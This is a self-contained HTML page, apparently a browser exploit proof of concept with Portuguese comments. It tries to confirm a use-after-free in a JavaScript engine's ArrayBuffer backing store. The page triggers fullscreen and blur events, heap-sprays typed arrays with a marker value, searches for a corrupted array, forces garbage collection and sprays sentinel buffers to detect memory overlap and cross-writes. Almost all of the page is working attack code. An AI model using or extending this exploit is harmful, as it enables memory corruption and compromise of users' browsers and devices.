<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>UAF Phase-1 Proof — Backing Store 2</title>
</head>
<body>
<pre id="log"></pre>
<button onclick="run()">EXECUTAR TESTE FASE 1</button>

<script>
const log = (s) => document.getElementById('log').textContent += s + "\n";

// Força pressão de heap para GC
function forceGC() {
    let trash = [];
    for (let i = 0; i < 20000; i++) {
        trash.push(new ArrayBuffer(0x1000));
    }
    trash = null;
}

// Cria muitos ArrayBuffers com sentinela conhecida
function sprayBuffers(count, size, sentinel) {
    const bufs = [];
    for (let i = 0; i < count; i++) {
        const ab = new ArrayBuffer(size);
        const dv = new DataView(ab);
        dv.setUint32(0, sentinel, true);
        bufs.push({ ab, dv });
    }
    return bufs;
}

function run() {
    log("=== FASE 1: PROVA DE UAF REAL (BACKING STORE) ===");
    log("Prepare-se: aperte OPTIONS quando solicitado.");

    const controllers = [];
    const PATTERN = 2.121995791e-314;

    // Controladores TypedArray
    for (let i = 0; i < 6000; i++) {
        const ta = new Float64Array(8);
        ta[0] = i;
        controllers.push(ta);
    }

    // Fullscreen para gatilhar blur/UAF (mantém sua técnica)
    const doc = document.documentElement;
    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();

    window.onblur = function () {
        log("[*] UAF window aberta.");

        // Spray que costuma ocupar o mesmo slab
        let spray = [];
        for (let i = 0; i < 10000; i++) {
            const t = new Float64Array(10);
            t.fill(PATTERN);
            spray.push(t);
        }

        // Encontrar TypedArray corrompido
        let corrupted = null;
        for (let i = 0; i < controllers.length; i++) {
            if (controllers[i][0] === PATTERN) {
                corrupted = controllers[i];
                break;
            }
        }

        if (!corrupted) {
            log("[-] UAF NÃO confirmado.");
            return;
        }

        log("[+] UAF CONFIRMADO (TypedArray).");

        // Captura do buffer potencialmente pós-free
        const buf = corrupted.buffer;
        const dv = new DataView(buf);
        log("[*] Capturado corrupted.buffer e DataView.");

        // Escrita inicial local
        dv.setUint32(0, 0x11111111, true);
        log("[*] Write local: 0x11111111");

        // Força GC e reuso
        forceGC();
        log("[*] GC forçado.");

        // Spray de ArrayBuffers com sentinela distinta
        const SENTINEL_A = 0x41414141;
        const SENTINEL_B = 0x42424242;
        const sprayedA = sprayBuffers(4000, buf.byteLength, SENTINEL_A);
        const sprayedB = sprayBuffers(4000, buf.byteLength, SENTINEL_B);
        log("[*] Spray de ArrayBuffers com sentinelas A/B concluído.");

        // Verificação 1: leitura inesperada
        const r0 = dv.getUint32(0, true);
        log("[*] Readback pós-GC: 0x" + r0.toString(16));

        if (r0 === SENTINEL_A || r0 === SENTINEL_B) {
            log("!!! SUCESSO: OVERLAP REAL DETECTADO (sentinela vista no DataView) !!!");
            return;
        }

        // Verificação 2: escrita cruzada
        sprayedA[0].dv.setUint32(0, 0xDEADBEEF, true);
        const r1 = dv.getUint32(0, true);
        log("[*] Após escrever em sprayedA[0]: 0x" + r1.toString(16));

        if (r1 === 0xDEADBEEF) {
            log("!!! SUCESSO: ESCRITA CRUZADA (UAF REAL) !!!");
            return;
        }

        // Verificação 3: instabilidade sem escrita
        forceGC();
        const r2 = dv.getUint32(0, true);
        log("[*] Readback após novo GC (sem escrita): 0x" + r2.toString(16));

        if (r2 !== r1) {
            log("!!! SUCESSO: INSTABILIDADE DE BACKING STORE (pós-free) !!!");
            return;
        }

        log("[-] Nenhuma evidência de UAF REAL detectada.");
        log("[-] Conclusão: backing store ainda válido OU não reaproveitado.");
    };
}
</script>
</body>
</html>


